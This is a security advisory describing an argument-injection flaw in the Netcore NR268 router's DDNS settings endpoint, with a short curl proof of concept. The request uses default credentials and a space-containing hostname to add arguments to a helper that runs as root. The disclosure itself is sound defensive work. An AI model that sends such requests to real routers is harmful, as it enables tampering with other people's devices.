# Netcore NR268 DDNS Management Argument Injection

**Vendor:** Netcore  
**Product:** NR268 Router  
**Affected Version:** NR268-V1.7.121109.bin  
**Vulnerability Type:** Argument Injection (CWE-88)  
**Credits:** Zhou Ao, Zhang Yu, Yang Yang, Liu Xin @Nebusec

## Summary

The DDNS setter accepts attacker-controlled provider, username, password, and hostname fields and forwards them into the DDNS backend. The worker builds `updatedd` / `oray` command lines with `sprintf` and no quoting, then tokenizes on spaces before `execvp()`. A crafted hostname such as `fw.example injected-argv` therefore injects extra `argv` entries into a root-run helper without any shell metacharacters. An authenticated POST to `/router/DDNSset.cgi` is enough to reshape the helper invocation inside the firmware field-length limits.

## Technical Details

`DDNSset_cgi` copies `ddns_sp`, `user_id`, `password`, and `hostname` with only length truncation. The backend builds command lines such as:

```
updatedd -o /var/run/ddns0.info dyndns fwuser:fwpass fw.example injected-argv ppp0
```

`exe_default` overwrites every ASCII space with NUL, stores token pointers, and calls `execvp()`. A hostname of `fw.example injected-argv` therefore becomes two argv elements. The same split applies to the `oray` command family through `user_id`.

### Affected Endpoint

- URL: `/router/DDNSset.cgi`
- Parameters: `ddns_sp`, `user_id`, `password`, `hostname`
- Method: POST
- Authentication: HTTP Basic authentication

## Proof of Concept

```bash
curl -s -u admin:admin -X POST "http://192.168.1.1/router/DDNSset.cgi" \
  --data-urlencode "ddns_sp=dyndns" \
  --data-urlencode "user_id=fwuser" \
  --data-urlencode "password=fwpass" \
  --data-urlencode "hostname=fw.example injected-argv"
```

The resulting helper argv is:

```
["updatedd", "-o", "/var/run/ddns0.info", "dyndns", "fwuser:fwpass", "fw.example", "injected-argv", "ppp0"]
```

The extra `injected-argv` token is created by space-splitting inside the accepted hostname length limit.

### Outcome

The DDNS worker receives extra argv tokens. The hostname `fw.example injected-argv` is split into `fw.example` and `injected-argv` before `execvp()`, reshaping the root-run helper invocation.

## Impact

- **Confidentiality:** Medium
- **Integrity:** High – provider, credentials, hostname, and interface argv can be rearranged
- **Availability:** Medium

An authenticated attacker can add or rearrange arguments to a root-run DDNS helper and break the trust the management plane places in the DDNS backend.
